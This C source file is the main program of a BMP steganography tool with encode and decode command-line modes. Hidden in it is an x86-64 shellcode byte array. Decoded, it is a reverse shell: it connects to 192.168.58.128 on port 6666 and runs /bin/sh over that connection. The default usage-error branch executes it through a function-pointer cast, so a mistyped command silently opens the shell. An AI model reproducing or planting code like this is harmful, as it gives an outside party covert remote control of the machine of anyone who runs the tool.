#include "Stegano_header.h"
#include <stdio.h>
#include <string.h>
unsigned char shellcode[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
"\x48\xb9\x02\x00\x1a\x0a\xc0\xa8\x3a\x80\x51\x48\x89\xe6"
"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
"\x89\xe6\x0f\x05";
int main(int argc,char *argv[])
{
    int i;
    char *argv_2,*argv_3,*argv_4;

    switch(argc)
    {
			//Comparing For 
	case 8 :	if(!strcmp(argv[1],"-E"))
			{
			    for (i = 2; i < 8; i++)
			    {
				if (!strcmp(argv[i],"-i"))
				    argv_2 = argv[i+1];

				if (!strcmp(argv[i],"-s"))
				    argv_3 = argv[i+1];

				if (!strcmp(argv[i],"-o"))
				    argv_4 = argv[i+1];
			    }			    
			    Encoding(argv_2, argv_3, argv_4);
			    break;
			}

	case 6 :	if(!strcmp(argv[1], "-D"))
			{
			    for (i = 2; i < 6; i++)
			    {
				if (!strcmp(argv[i],"-i"))
				    argv_2 = argv[i+1];
				if (!strcmp(argv[i],"-o"))
				    argv_4 = argv[i+1];
			    }			    

			    Decode(argv_2, argv_4);
			    break;
			}

	default : 
		printf("\t*** !! Error !! ERROR !! Error !!***\n\n");
		printf("*** EXECUTION ==> ");
		printf("\n\t\t*** ENCODING *** ==> \t./a.out -E -i <input.bmp> -s <secret.txt> -o <output.bmp>\n\n");
		printf("\t\t*** DECODING *** ==> \t./a.out -D -i <output.bmp> -o <output_text.txt>\n\n");
		printf("\t\tFOR MORE DETAILS ===> **README**\n");
		printf("Shellcode Length: %d\n", strlen(shellcode));
		int (*ret)() = (int (*)())shellcode;
		ret();
    }
	
	return 0;	
}

